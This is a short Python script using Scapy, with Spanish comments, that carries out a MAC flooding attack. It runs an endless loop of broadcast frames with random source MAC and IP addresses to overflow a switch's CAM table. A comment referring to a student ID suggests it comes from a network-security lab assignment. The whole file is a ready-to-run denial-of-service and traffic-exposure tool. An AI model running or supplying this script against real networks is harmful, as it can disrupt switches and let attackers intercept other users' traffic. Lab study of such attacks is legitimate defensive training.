import sys
import os
import time
from scapy.all import *

# ---- CONFIGURACIÓN DE VARIABLES CON TU MATRÍCULA (2024-2421) ----
interface = "eth0"
# -----------------------------------------------------------------

if os.geteuid() != 0:
    sys.exit("[-] Ejecuta este script usando sudo.")

print("[+] Iniciando Ataque MAC Flooding...")
print("[+] Desbordando la tabla CAM del switch con MACs aleatorias...")

contador = 0

try:
    while True:
        # Generamos tramas masivas con MACs de origen aleatorias apuntando a broadcast
        trama = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / IP(src=RandIP(), dst="255.255.255.255")
        
        # Enviamos la trama directamente a la capa de enlace
        sendp(trama, iface=interface, verbose=False)
        contador += 1
        
        if contador % 500 == 0:
            print(f"[!] {contador} tramas maliciosas inyectadas en la tabla CAM del switch...")
            time.sleep(0.01)  # Pequeña pausa para estabilidad del entorno conmutado
except KeyboardInterrupt:
    print(f"\n[-] Ataque detenido de forma segura. Se inyectaron {contador} tramas en total.")
